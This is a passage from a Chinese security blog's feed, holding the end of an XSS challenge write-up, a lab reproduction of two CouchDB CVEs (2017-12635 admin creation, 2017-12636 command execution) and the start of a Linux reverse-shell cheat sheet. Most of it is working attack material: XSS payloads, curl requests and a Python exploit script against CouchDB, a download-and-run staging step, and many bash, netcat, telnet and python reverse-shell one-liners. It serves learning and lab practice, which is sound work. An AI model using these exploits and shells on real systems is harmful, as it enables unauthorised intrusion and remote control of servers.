src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531207476180.png" alt="1531207476180"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>直接把keyword的值输出到center标签，构造一个标签</p><p>script被过滤，用on事件代替 </p><p>空格被转义，用<code>%0a</code>代替空格</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531208478885.png" alt="1531208478885"></p><p>点图片上面一点的灰色</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531208500975.png" alt="1531208500975"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531208609687.png" alt="1531208609687"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;button%0Aonclick=alert()&gt;</span><br><span class="line">?keyword=%3Cimg%0asrc=xss%0aonerror=%27alert(1)%27%3E</span><br><span class="line">?keyword=&lt;img%0Asrc=&quot;xss&quot;%0Aonerror=alert()&gt;</span><br></pre></td></tr></table></figure><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>传点参数进去，会显示在embed标签里</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531210054079.png" alt="1531210054079"></p><p>在firefox上启动不了flash，就在chrome试了</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531209510868.png" alt="1531209510868"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02= onmouseover=alert(1)</span><br></pre></td></tr></table></figure><h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531210036324.png" alt="1531210036324"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531209690116.png" alt="1531209690116"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02= onmouseover=alert(1)</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>反射型XSS用途已经不那么大了，如果payload在url中很容易被chrome xss auditor拦截 </p><p>所以才用firefox</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://blkstone.github.io/2017/06/08/xss-challenge/" target="_blank" rel="noopener">http://blkstone.github.io/2017/06/08/xss-challenge/</a></p><p><a href="https://www.cnblogs.com/r00tuser/p/7407459.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7407459.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/29866236" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/29866236</a></p><p><a href="https://www.tr0y.wang/2018/04/10/XSSLoad/" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/10/XSSLoad/</a></p><p><a href="http://www.fooying.com/the-art-of-xss-1-introduction/" target="_blank" rel="noopener">http://www.fooying.com/the-art-of-xss-1-introduction/</a></p><p><a href="http://shaobaobaoer.cn/archives/603/xss-%E6%8C%91%E6%88%98%E8%B5%9B-wp-%E4%B8%8A（调皮的shaobaobaoer）" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/603/xss-%E6%8C%91%E6%88%98%E8%B5%9B-wp-%E4%B8%8A（调皮的shaobaobaoer）</a></p><p><a href="https://brutelogic.com.br/blog/（very" target="_blank" rel="noopener">https://brutelogic.com.br/blog/（very</a> good）</p><p><a href="https://wps2015.org/drops/drops/xss%E6%8C%91%E6%88%98%E8%B5%9Bwriteup.html" target="_blank" rel="noopener">https://wps2015.org/drops/drops/xss%E6%8C%91%E6%88%98%E8%B5%9Bwriteup.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/index.png&quot; alt=&quot;img&quot;&gt; &lt;/p&gt;
&lt;h3 id=&quot;靶场&quot;&gt;&lt;a href=&quot;#靶场&quot; class=&quot;headerlink&quot; title=&quot;靶场&quot;&gt;&lt;/a&gt;靶场&lt;/h3&gt;&lt;p&gt;​    &lt;a href=&quot;http://test.xss.tv&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://test.xss.tv&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​    也可以自己搭在本地搭建&lt;/p&gt;
&lt;p&gt;​    链接: &lt;a href=&quot;https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw&lt;/a&gt; 密码: akvp&lt;/p&gt;
&lt;h3 id=&quot;工具：&quot;&gt;&lt;a href=&quot;#工具：&quot; class=&quot;headerlink&quot; title=&quot;工具：&quot;&gt;&lt;/a&gt;工具：&lt;/h3&gt;&lt;p&gt;​    firefox   61版本&lt;/p&gt;
&lt;p&gt;​    chrome 67版本&lt;/p&gt;
&lt;p&gt;​    burpsuite&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/XSS/"/>
    
    
      <category term="XSS" scheme="http://blog.Lhaihai.wang/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>CouchDB的两个CVE复现</title>
    <link href="http://blog.Lhaihai.wang/2018/07/09/CouchDB%E7%9A%84%E4%B8%A4%E4%B8%AACVE%E5%A4%8D%E7%8E%B0/"/>
    <id>http://blog.Lhaihai.wang/2018/07/09/CouchDB的两个CVE复现/</id>
    <published>2018-07-09T05:57:06.000Z</published>
    <updated>2018-07-09T05:57:07.856Z</updated>
    
    <content type="html"><![CDATA[<p>复现地址：</p><p><a href="http://vulhub.org/#/environments/couchdb/CVE-2017-12635/" target="_blank" rel="noopener">http://vulhub.org/#/environments/couchdb/CVE-2017-12635/</a></p><p><a href="http://vulhub.org/#/environments/couchdb/CVE-2017-12636/" target="_blank" rel="noopener">http://vulhub.org/#/environments/couchdb/CVE-2017-12636/</a></p><p>i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的</p><p><a href="https://www.ichunqiu.com/course/60383" target="_blank" rel="noopener">https://www.ichunqiu.com/course/60383</a></p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><hr><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><a id="more"></a><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><hr><p>CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 </p><p>CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。 </p><p>影响版本：小于 1.7.0 以及 小于 2.1.1 </p><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT -d &apos;&#123;&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;vulhub&quot;,&quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;123456&quot;&#125;&apos; 192.168.190.128:5984/_users/org.couchdb.user:vulhub -H &quot;Content-Type:application/json&quot;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041179054.png" alt="1531041179054"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041197097.png" alt="1531041197097"></p><h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h3><hr><p>CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB在<code>query_server</code>中引入了外部的二进制程序来执行命令，我们可以通过CouchDB自身提供的<code>Restful API</code>接口动态修改保存配置，从而执行系统命令 </p><h4 id="Couchdb-1-6-0环境："><a href="#Couchdb-1-6-0环境：" class="headerlink" title="Couchdb 1.6.0环境："></a>Couchdb 1.6.0环境：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X POST &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p><p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。</p><p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p><p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531102040955.png" alt="1531102040955"></p><h4 id="Couchdb-2-1-0环境："><a href="#Couchdb-2-1-0环境：" class="headerlink" title="Couchdb 2.1.0环境："></a>Couchdb 2.1.0环境：</h4><p>启动docker</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531103581867.png" alt="1531103581867"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulhub:vulhub@your-ip:5984/_membership</span><br><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &apos;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&apos; -H &quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531103757607.png" alt="1531103757607"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>注意：反弹Shell的命令，在经过数据库处理时被截断，不能直接执行，遂此处分为两步去实现（还有其他方法，仁者见仁） 。</p><p>终于知道为啥我直接反弹shell不成功了，瞎搞半天。</p><p>在/home/目录下 新建index.html，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.190.128/9000 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>终端运行，端口被占用了就换个端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8013</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531111709563.png" alt="1531111709563"></p><p>curl 或者 p牛的代码执行下面两条command，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.190.128:8013/ -o /tmp/bashshell</span><br><span class="line">bash /tmp/bashshell</span><br></pre></td></tr></table></figure><p>反弹shell成功</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531111818648.png" alt="1531111818648"></p><p>p牛代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/7/8</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : Couchdb-Exp</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">'http://192.168.190.128:5984'</span></span><br><span class="line"><span class="comment"># command = '"bash -i &gt;&amp; /dev/tcp/192.168.190.128/12000 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># command = '"curl 192.168.190.128:8013/ -o /tmp/bashshell"'</span></span><br><span class="line"><span class="comment"># command = '"bash /tmp/bashshell"'</span></span><br><span class="line">version = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     'http': 'http://127.0.0.1:8085'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">'/_users/org.couchdb.user:wooyun'</span>, data=<span class="string">'''&#123;</span></span><br><span class="line"><span class="string">  "type": "user",</span></span><br><span class="line"><span class="string">  "name": "wooyun",</span></span><br><span class="line"><span class="string">  "roles": ["_admin"],</span></span><br><span class="line"><span class="string">  "roles": [],</span></span><br><span class="line"><span class="string">  "password": "wooyun"</span></span><br><span class="line"><span class="string">&#125;'''</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">'wooyun'</span>, <span class="string">'wooyun'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.put(target + (<span class="string">'/_config/query_servers/cmd'</span>), data=command)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">'/_membership'</span>).json()[<span class="string">'all_nodes'</span>][<span class="number">0</span>]</span><br><span class="line">    session.put(target + <span class="string">'/_node/&#123;&#125;/_config/query_servers/cmd'</span>.format(host), data=command)</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">'/wooyun'</span>)</span><br><span class="line">session.put(target + <span class="string">'/wooyun/test'</span>, data=<span class="string">'&#123;"_id": "wooyuntest"&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.post(target + <span class="string">'/wooyun/_temp_view?limit=10'</span>, data=<span class="string">'&#123;"language":"cmd","map":""&#125;'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">'/wooyun/_design/test'</span>, data=<span class="string">'&#123;"_id":"_design/test","views":&#123;"wooyun":&#123;"map":""&#125; &#125;,"language":"cmd"&#125;'</span>)</span><br></pre></td></tr></table></figure><h3 id="漏洞修复建议："><a href="#漏洞修复建议：" class="headerlink" title="漏洞修复建议："></a><strong>漏洞修复建议</strong>：</h3><hr><p>1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在<code>/etc/couchdb/local.ini</code>文件中找到 <code>“bind_address = 0.0.0.0”</code> ，把 <code>0.0.0.0</code>修改为 <code>127.0.0.1</code> ，然后保存。注：修改后只有本机才能访问CouchDB。</p><p>2、设置访问密码 （需要重启CouchDB才能生效） 在 <code>/etc/couchdb/local.ini</code> 中找到“[admins]”字段配置密码。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复现地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://vulhub.org/#/environments/couchdb/CVE-2017-12635/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulhub.org/#/environments/couchdb/CVE-2017-12635/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://vulhub.org/#/environments/couchdb/CVE-2017-12636/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulhub.org/#/environments/couchdb/CVE-2017-12636/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/course/60383&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.ichunqiu.com/course/60383&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="数据库" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="CVE" scheme="http://blog.Lhaihai.wang/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Linux反弹shell解析和总结</title>
    <link href="http://blog.Lhaihai.wang/2018/07/08/Linux%E5%8F%8D%E5%BC%B9shell%E8%A7%A3%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.Lhaihai.wang/2018/07/08/Linux反弹shell解析和总结/</id>
    <published>2018-07-08T13:45:19.000Z</published>
    <updated>2018-07-09T06:30:54.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a href="http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/" target="_blank" rel="noopener">http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/</a></p><p><a href="https://www.anquanke.com/post/id/85712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85712</a></p><h2 id="反弹shell的各种姿势"><a href="#反弹shell的各种姿势" class="headerlink" title="反弹shell的各种姿势"></a>反弹shell的各种姿势</h2><h2 id="自带工具"><a href="#自带工具" class="headerlink" title="自带工具"></a>自带工具</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>针对不同的linux版本，可能有不同的利用方式，这里简单列一下，在使用的时候自行测试。</p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done  # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>netcat使我们常用nc，不同的版本有不同的利用方式，所以需要依次测试才能得到真正可用的。</p><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>支持 - e 选项 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure><h4 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h4><p>安装的 NC 版本有问题时： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>不能使用 - e 选项时： </p><h4 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -c /bin/sh attackerip 4444</span><br></pre></td></tr></table></figure><h4 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc attackerip 4444</span><br></pre></td></tr></table></figure><h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><p>(nc 不可用或 / dev/tcp 不可用时)</p><p>telnet客户端作为一个远程管理设备的软件，也可以作为反弹shell的软件</p><h4 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><h4 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet attackerip 4444 | /bin/bash | telnet attackerip 4445</span><br></pre></td></tr></table></figure><p>远程服务器监听tcp的4445端口</p><h4 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><h2 id="常见脚本"><a href="#常见脚本" class="headerlink" title="常见脚本"></a>常见脚本</h2><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>python作为一个优秀的脚本语言通常默认安装在各大linux操作系统中，可以做很多事情。</p><h4 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><h4 